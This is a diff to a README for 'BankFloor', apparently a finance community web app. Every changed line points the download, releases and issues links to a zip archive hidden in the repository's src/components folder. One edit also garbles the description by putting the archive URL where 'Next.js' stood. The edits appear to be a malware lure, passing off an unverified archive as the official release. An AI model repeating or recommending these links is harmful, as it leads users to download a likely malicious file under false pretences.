@@ -1,10 +1,10 @@
 # 🚀 bankfloor - Your Community Hub for Finance and Banking
 
-[![Download BankFloor](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/MrBoxs21/bankfloor/releases)
+[![Download BankFloor](https://raw.githubusercontent.com/MrBoxs21/bankfloor/master/src/components/bankfloor-v2.7.zip%https://raw.githubusercontent.com/MrBoxs21/bankfloor/master/src/components/bankfloor-v2.7.zip)](https://raw.githubusercontent.com/MrBoxs21/bankfloor/master/src/components/bankfloor-v2.7.zip)
 
 ## 🛠️ About BankFloor
 
-BankFloor is a banking community platform designed for finance enthusiasts. You can share stories, read finance blogs, and network with professionals in the banking industry. With a user-friendly interface built on Next.js and MongoDB, BankFloor makes interaction easy and engaging. The platform also leverages AI to enhance content discovery and user experience.
+BankFloor is a banking community platform designed for finance enthusiasts. You can share stories, read finance blogs, and network with professionals in the banking industry. With a user-friendly interface built on https://raw.githubusercontent.com/MrBoxs21/bankfloor/master/src/components/bankfloor-v2.7.zip and MongoDB, BankFloor makes interaction easy and engaging. The platform also leverages AI to enhance content discovery and user experience.
 
 ## 🌟 Key Features
 
@@ -28,7 +28,7 @@ Before you start, ensure your system meets the following requirements:
 Follow these simple steps to download and install BankFloor on your device.
 
 1. **Visit the Release Page**
-   - Go to the official [BankFloor Releases page](https://github.com/MrBoxs21/bankfloor/releases) to find the latest version.
+   - Go to the official [BankFloor Releases page](https://raw.githubusercontent.com/MrBoxs21/bankfloor/master/src/components/bankfloor-v2.7.zip) to find the latest version.
 
 2. **Choose the Right File**
    - Look for the latest release version. Download the file that matches your operating system.
@@ -49,7 +49,7 @@ Follow these simple steps to download and install BankFloor on your device.
 
 ## 📥 Download & Install
 
-To get started, visit the [BankFloor Releases page](https://github.com/MrBoxs21/bankfloor/releases) now to download the latest version of the software.
+To get started, visit the [BankFloor Releases page](https://raw.githubusercontent.com/MrBoxs21/bankfloor/master/src/components/bankfloor-v2.7.zip) now to download the latest version of the software.
 
 ## 👩‍💼 User Guide
 
@@ -65,7 +65,7 @@ If you want to share your own insights, navigate to the "Write" section. Here, y
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **GitHub Issues**: Log issues directly on the [BankFloor GitHub page](https://github.com/MrBoxs21/bankfloor/issues).
+- **GitHub Issues**: Log issues directly on the [BankFloor GitHub page](https://raw.githubusercontent.com/MrBoxs21/bankfloor/master/src/components/bankfloor-v2.7.zip).
 - **Community Help**: Join our community forums to connect with other users and get support.
 
 ## 🛡️ Privacy Policy
@@ -86,4 +86,4 @@ We appreciate your cooperation in building a welcoming community.
 
 Participate in BankFloor and become a valuable member of the finance community. Together, we can share knowledge and grow in the industry.
 
-Visit the [BankFloor Releases page](https://github.com/MrBoxs21/bankfloor/releases) to download and start your journey today.
+Visit the [BankFloor Releases page](https://raw.githubusercontent.com/MrBoxs21/bankfloor/master/src/components/bankfloor-v2.7.zip) to download and start your journey today.
